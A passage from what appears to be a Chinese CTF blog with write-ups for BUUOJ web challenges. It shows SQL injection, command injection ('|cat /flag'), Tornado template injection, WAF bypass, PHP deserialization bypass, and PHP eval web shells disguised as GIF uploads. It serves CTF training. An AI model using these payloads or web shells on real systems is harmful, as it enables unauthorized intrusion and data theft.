1=1 #</span><br><span class=\"line\">任意密码</span><br></pre></td></tr></table></figure>\n\n<p>这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳</p>\n<p>字段数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure>\n\n<p>爆库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class=\"line\"></span><br><span class=\"line\">geekuser,l0ve1ysq1</span><br></pre></td></tr></table></figure>\n\n<p>爆字段值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27; #</span><br><span class=\"line\"></span><br><span class=\"line\">id,username,password</span><br></pre></td></tr></table></figure>\n\n<p>爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag&#123;c4e8849c-e0e3-4e0d-b701-26a5abeec46a&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"2021-01-21\"><a href=\"#2021-01-21\" class=\"headerlink\" title=\"2021.01.21\"></a>2021.01.21</h1><h1 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h1><p><a href=\"https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/\">传送门</a></p>\n<hr>\n<h1 id=\"ACTF2020-新生赛-Exec\"><a href=\"#ACTF2020-新生赛-Exec\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Exec\"></a>[ACTF2020 新生赛]Exec</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png\"></p>\n<p>肯定是尝试管道符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1|cat /flag</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h1><p>打开页面三个超链接</p>\n<blockquote>\n<p>/flag.txt</p>\n<p>/welcome.txt</p>\n<p>hints.txt</p>\n</blockquote>\n<p>内容分别是</p>\n<blockquote>\n<p>flag in /fllllllllllllag</p>\n<p>render</p>\n<p>md5(cookie_secret+md5(filename))</p>\n</blockquote>\n<p>进入hints.txt注意到url地址此时为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure>\n\n<p>再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供<strong>filehash</strong>值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称<code>filename</code>有了，接下来就是获取<code>cookie_secret</code>的值。</p>\n<p>接下来触及到盲区了，获取cookie_secret是看wp。</p>\n<blockquote>\n<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>\n</blockquote>\n<blockquote>\n<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>\n</blockquote>\n<p>获取cookie_secret的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png\"></p>\n<p>获得cookie_secret的值为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eb326d39-cd67-47bd-b2d3-71125996417b</span><br></pre></td></tr></table></figure>\n\n<p>根据hints.txt的url验证一下是如何加密的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png\"></p>\n<p>选中的蓝色部分是<code>/hints.txt</code>加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/file?filename=/hints.txt&amp;filehash=2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png\"></p>\n<p>一句话直接连。</p>\n<hr>\n<h1 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png\"></p>\n<p>一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：<strong>calc.php</strong>，但是也有一句很重要的注释</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png\"></p>\n<p>php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为<strong>WAF</strong>，接下来是参考网上的wp自己的理解</p>\n<p>可以在calc.php传参</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">? num=a</span><br></pre></td></tr></table></figure>\n\n<p>php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格’ ‘会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。</p>\n<p>接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()</p>\n<p>查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）——&gt;   ‘/‘  ：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>\n\n<p>找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png\"></p>\n<p>查看源码在”氛围”这两个字上有隐藏的跳转Secret.php。进入以后页面显示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">It doesn&#x27;t come from &#x27;https://www.Sycsecret.com&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure>\n\n<p>加上User-Agent。提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure>\n\n<p>加上X-Forwarded-For。<a href=\"https://www.runoob.com/w3cnote/http-x-forwarded-for.html\">HTTP X-Forwarded-For 介绍</a></p>\n<p>最终的请求头：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Secret.php HTTP/1.1</span><br><span class=\"line\">Host: node3.buuoj.cn:26715</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Syclover</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">x-forwarded-for: 127.0.0.1</span><br><span class=\"line\">referer: https://www.Sycsecret.com</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png\"></p>\n<p>源码备份在<code>www.zip</code>中。下载以后有五个文件</p>\n<blockquote>\n<p>class.php</p>\n<p>flag.php</p>\n<p>index.js</p>\n<p>index.php</p>\n<p>style.css</p>\n</blockquote>\n<p>在index.php中有一段代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    include &#x27;class.php&#x27;;</span><br><span class=\"line\">    $select = $_GET[&#x27;select&#x27;];</span><br><span class=\"line\">    $res=unserialize(@$select);</span><br><span class=\"line\">    ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>再结合又一个class.php，所以这道题考点应该是反序列化。</p>\n<p>class.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Name&#123;</span><br><span class=\"line\">    private $username = &#x27;nonono&#x27;;</span><br><span class=\"line\">    private $password = &#x27;yesyes&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($username,$password)&#123;</span><br><span class=\"line\">        $this-&gt;username = $username;</span><br><span class=\"line\">        $this-&gt;password = $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        if ($this-&gt;password != 100) &#123;</span><br><span class=\"line\">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You name is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You password is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class=\"line\">            global $flag;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解<a href=\"https://www.cnblogs.com/zy-king-karl/p/11436872.html\">CVE-2016-7124漏洞复现</a></p>\n<p>我使用的构造对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Name&#123;</span><br><span class=\"line\">    private $username =&#x27;admin&#x27;;</span><br><span class=\"line\">    private $password =&#x27;100&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = new Name;</span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019]Upload\"></a>[极客大挑战 2019]Upload</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png\"></p>\n<p>先尝试上传一个gif图片马内容为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>页面提示过滤：</p>\n<blockquote>\n<p> NO! HACKER! your file included ‘&lt;?’</p>\n</blockquote>\n<p>尝试script执行php代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png\"></p>\n<hr>\n<h1 id=\"2021-01-28\"><a href=\"#2021-01-28\" class=\"headerlink\" title=\"2021.01.28\"></a>2021.01.28</h1><h1 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png\"></p>\n<p>尝试万能密码，发现报错了：1=1#’ and password=’123’，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有<strong>information</strong>这个词，其中的<strong>for</strong>也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。</p>\n<p>爆数据库（填密码）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #</span><br></pre></td></tr></table></figure>\n\n<p>爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&#x27;b4bsql&#x27; #</span><br></pre></td></tr></table></figure>\n\n<p>爆字段值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ACTF2020-新生赛-Upload\"><a href=\"#ACTF2020-新生赛-Upload\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Upload\"></a>[ACTF2020 新生赛]Upload</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png\"></p>\n<p>指针放在灯泡上护显示上传文件的，图片马</p>\n<p>233.gif</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>尝试phtml是否被过滤，直接上传成功。蚁剑连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------WebKitFormBoundaryUMSByAQmR2cduL6R</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;233.phtml&quot;</span><br><span class=\"line\">Content-Type: image/gif</span><br><span class=\"line\"></span><br><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;a&#x27;]);</span><br><span class=\"line\">------WebKitFormBoundaryUMSByAQmR2cduL6R</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">upload</span><br><span class=\"line\">------WebKitFormBoundaryUMSByAQmR2cduL6R--</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Try to find out source file!</span><br></pre></td></tr></table></figure>\n\n<p>题目提示备份文件，备份文件常见后缀：</p>\n<blockquote>\n<p>.git .svn .swp .~ .bak .bash_history</p>\n</blockquote>\n<p>尝试index.php.bak，下载了一个备份文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include_once &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class=\"line\">    $key = $_GET[&#x27;key&#x27;];</span><br><span class=\"line\">    if(!is_numeric($key)) &#123;</span><br><span class=\"line\">        exit(&quot;Just num!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $key = intval($key);</span><br><span class=\"line\">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class=\"line\">    if($key == $str) &#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">    echo &quot;Try to find out source file!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的<code>==</code>和<code>===</code>的区别。贴一段简单代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$str = &#x27;abc&#x27;;</span><br><span class=\"line\">if(0==$str)&#123;</span><br><span class=\"line\">\techo &quot;真&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &quot;假&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>==</code>在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。</p>\n<p>全等于<code>===</code>操作过程如下： </p>\n<ol>\n<li>操作符两边的数据类型如果不相同，返回false 。</li>\n<li>操作符两边的值如果不相同，返回false 。</li>\n<li>最后将上面2步的操作进行与操作。返回与操作的结果。</li>\n</ol>\n<p>所以最终的payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?key=123</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"HCTF-2018-admin\"><a href=\"#HCTF-2018-admin\" class=\"headerlink\" title=\"[HCTF 2018]admin\"></a>[HCTF 2018]admin</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png\"></p>\n<p>可以在注释里找到</p>\n<blockquote>\n<!-- you are not admin -->\n</blockquote>\n<p>思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。</p>\n<ul>\n<li>post。发表文章，但是没能找到在哪里打开</li>\n<li>change password。改密码，尝试下能不能抓包改到admin的密码</li>\n</ul>\n<p>修改密码抓到的包：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png\"></p>\n<p>感觉并没有什么下手的地方，唯一的就是session可能和身份有关。</p>\n<p>以下的是看网上的wp</p>\n<p>在change password页面查看源码，发现提供了题目的源码地址</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>网站使用的是flask框架，具体路由表如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/code&#x27;</span></span>)\t\t</span><span class=\"comment\">#二维码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_code</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/index&#x27;</span></span>)\t\t</span><span class=\"comment\">#首页</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>, methods = [<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#注册</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span>, methods = [<span 